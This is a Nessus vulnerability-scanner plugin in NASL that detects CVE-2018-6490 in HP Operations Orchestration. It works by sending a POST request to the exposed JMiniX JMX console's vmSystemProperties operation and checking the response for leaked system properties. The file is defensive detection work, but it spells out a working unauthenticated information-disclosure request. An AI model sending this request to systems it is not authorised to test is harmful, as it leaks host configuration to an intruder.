#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(107094);
  script_version("1.4");
  script_cvs_date("Date: 2019/11/08");

  script_cve_id("CVE-2018-6490");
  script_xref(name:"TRA", value:"TRA-2018-05");

  script_name(english:"Micro Focus Operations Orchestration JMiniX Multiple Vulnerabilities");
  script_summary(english:"Sends an HTTP request");

  script_set_attribute(attribute:"synopsis", value:
"The remote server is affected by information disclosure and
denial of service attacks.");
  script_set_attribute(attribute:"description", value:
"The remote Operations Orchestration server is affected by
information disclosure and denial of service attacks when
the JMiniX JMX console is accessible.

Note that in order to safely identify a vulnerable host, Nessus has only tested
for the information disclosure flaw.");
  # https://softwaresupport.softwaregrp.com/document/-/facetsearch/document/KM03103896
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a1f323aa");
  script_set_attribute(attribute:"solution", value:
"Follow the vendor recommendation for upgrade or mitigation.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2018/03/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2018/03/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/03/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:operations_orchestration");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("hp_operations_orchestration_detect.nbin");
  script_require_keys("installed_sw/HP Operations Orchestration");
  script_require_ports("Services/www", 8080, 8443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");


appname = "HP Operations Orchestration";
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:8080);
install = get_single_install(app_name:appname, port:port);

# build reporting information
dir = install['path'];
version = install['version'];
install_url = build_url(port:port, qs:dir);

# grab a info for the information leak
url = "/oo/jminix/servers/0/domains/com.sun.management/mbeans/type=DiagnosticCommand/operations/vmSystemProperties%28%29/";
res = http_send_recv3(
  method:"POST",
  item:url, 
  port:port,
  data:"executed=true",
  content_type:"application/x-www-form-urlencoded",
  exit_on_fail:TRUE);

if ("200 OK" >!< res[0] || "host.name" >!< res[2])
{
  audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);
}

security_report_v4(severity:SECURITY_HOLE, port:port, generic:TRUE, request:make_list(url), output:res[2]);
exit(0);

